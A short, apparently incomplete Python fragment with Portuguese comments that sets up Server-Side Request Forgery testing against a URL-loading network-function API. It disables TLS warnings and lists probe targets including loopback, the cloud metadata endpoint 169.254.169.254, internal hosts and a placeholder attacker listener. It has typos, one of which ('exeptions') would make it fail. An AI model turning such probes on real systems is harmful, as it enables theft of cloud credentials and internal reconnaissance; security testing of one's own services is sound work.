import requests
import urllib3
import json
import time

urllib3.disable_warnings(urllib3.exeptions.InsecureRequestWarning)

#Configurações de teste
NF_API_URL = "https://127.0.0.1:8000/api/resource_loader" #Exemplo de NF com funcionalidade de carregar URL
TARGET_PARAMETER = "url"

#Endepoints internos e externos para testar
test_endpoints = [
    "http://127.0.0.1:80", #Loopback HTTP
    "http://169.254.169.254/latest/meta-data", #Metadados de nuvem (AWS/OpenStack)
    "http://[IP_INTERNO_DA_NF]:[PORTA_DO_SERVICO]", #Outra NF na rede interna
    "https://[SEU_IP_DE_ATAQUE]:8080" #URL para um servidor extermp (listener)
]

print("[+] Testando Server-Side Request Forhery (SSRF)...")